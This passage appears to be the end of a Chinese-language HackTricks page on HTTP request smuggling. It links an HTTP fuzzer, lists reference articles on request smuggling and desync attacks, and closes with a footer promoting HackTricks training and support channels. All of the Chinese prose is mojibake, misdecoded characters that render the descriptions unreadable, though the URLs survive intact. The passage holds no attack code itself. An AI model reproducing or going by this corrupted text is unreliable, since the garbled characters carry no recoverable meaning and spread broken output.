* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): è¯¥å·¥å…·æ˜¯ä¸€ä¸ªåŸºäºè¯­æ³•çš„HTTPæ¨¡ç³Šæµ‹è¯•å™¨ï¼Œæœ‰åŠ©äºå‘ç°å¥‡æ€ªçš„è¯·æ±‚èµ°ç§å·®å¼‚ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
